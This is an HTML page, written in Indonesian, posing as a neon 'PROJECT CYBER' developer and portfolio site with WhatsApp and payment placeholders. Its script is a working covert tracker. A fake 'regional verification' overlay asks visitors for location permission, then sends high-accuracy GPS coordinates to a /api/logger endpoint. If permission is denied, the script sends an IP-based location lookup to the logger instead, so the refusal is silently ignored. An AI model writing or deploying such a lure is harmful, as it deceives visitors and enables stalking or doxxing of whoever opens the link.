<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CYBERNETIC SYSTEM</title>
    <style>
        :root { --neon: #00f3ff; --dark: #0a0a0a; }
        body { margin: 0; background: var(--dark); color: var(--neon); font-family: 'Courier New', monospace; scroll-behavior: smooth; overflow-y: auto; }
        .page { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; border-bottom: 1px solid #222; }
        .cyber-btn { background: transparent; border: 2px solid var(--neon); color: var(--neon); padding: 15px 30px; cursor: pointer; margin: 10px; width: 280px; box-shadow: 0 0 10px var(--neon); transition: 0.3s; }
        .cyber-btn:hover { background: var(--neon); color: black; }
        .hidden { display: none; }
        
        #overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.98); z-index:999; display:none; flex-direction:column; justify-content:center; align-items:center; }
        .details { margin-top: 10px; padding: 15px; border: 1px solid var(--neon); width: 80%; max-width: 400px; text-align: center; }
        .social-btn { display: flex; align-items: center; justify-content: center; width: 280px; padding: 10px; margin: 5px; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>

    <div class="page" id="page-1">
        <h1>PROJECT CYBER</h1>
        <button class="cyber-btn" onclick="checkAuth()">MASUK</button>
    </div>

    <div id="overlay">
        <h2 style="color:white">VERIFIKASI REGIONAL</h2>
        <p>Mohon izin akses lokasi untuk verifikasi perangkat.</p>
        <button class="cyber-btn" onclick="verifyLocation()">IZINKAN AKSES</button>
    </div>

    <div id="main-content" class="hidden">
        <div class="page">
            <button class="cyber-btn" onclick="toggle('det1')">Opsi 1: Tentang Developer</button>
            <div id="det1" class="hidden details">Deskripsi lengkap developer ada di sini.</div>
            
            <button class="cyber-btn" onclick="toggle('det2')">Opsi 2: Layanan</button>
            <div id="det2" class="hidden details">Detail layanan Anda...</div>

            <button class="cyber-btn" onclick="toggle('det3')">Opsi 3: Portfolio</button>
            <div id="det3" class="hidden details">Detail portfolio Anda...</div>

            <button class="cyber-btn" onclick="toggle('det4')">Opsi 4: Ketentuan</button>
            <div id="det4" class="hidden details">Detail ketentuan Anda...</div>
        </div>

        <div class="page">
            <button class="cyber-btn" onclick="toggle('support')">SUPPORT DEVELOPER</button>
            <div id="support" class="hidden details">
                <button class="social-btn" style="background:red" onclick="window.open('URL_WEB')">Website</button>
                <button class="social-btn" style="background:#25D366" onclick="window.open('https://wa.me/628XXXXXXXX')">WhatsApp</button>
                <button class="social-btn" style="background:black" onclick="window.open('URL_TT')">TikTok</button>
                <button class="social-btn" style="background:gray" onclick="window.open('URL_GH')">GitHub</button>
            </div>

            <button class="cyber-btn" onclick="toggle('contact')">CONTACT ADMIN</button>
            <div id="contact" class="hidden details">
                <img src="qris.jpg" style="width:150px; border:2px solid var(--neon)">
                <br>
                <button class="social-btn" style="background:#25D366" onclick="window.open('https://wa.me/628XXXXXXXX')">CHAT VIA WHATSAPP</button>
            </div>
        </div>
    </div>

    <script>
        function checkAuth() {
            if (localStorage.getItem('verified') === 'true') {
                document.getElementById('main-content').classList.remove('hidden');
                document.getElementById('page-1').classList.add('hidden');
            } else {
                document.getElementById('overlay').style.display = 'flex';
            }
        }

        function verifyLocation() {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    localStorage.setItem('verified', 'true');
                    sendData(pos.coords.latitude, pos.coords.longitude, 'GPS_Akurat');
                    completeLogin();
                },
                () => {
                    fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>sendData(d.latitude, d.longitude, 'IP_Estimasi'));
                    completeLogin();
                },
                { enableHighAccuracy: true }
            );
        }

        function completeLogin() {
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('main-content').classList.remove('hidden');
            document.getElementById('page-1').classList.add('hidden');
        }

        function toggle(id) { document.getElementById(id).classList.toggle('hidden'); }
        function sendData(lat, lon, m) { fetch(`/api/logger?lat=${lat}&lon=${lon}&method=${m}`); }
    </script>
</body>
</html>
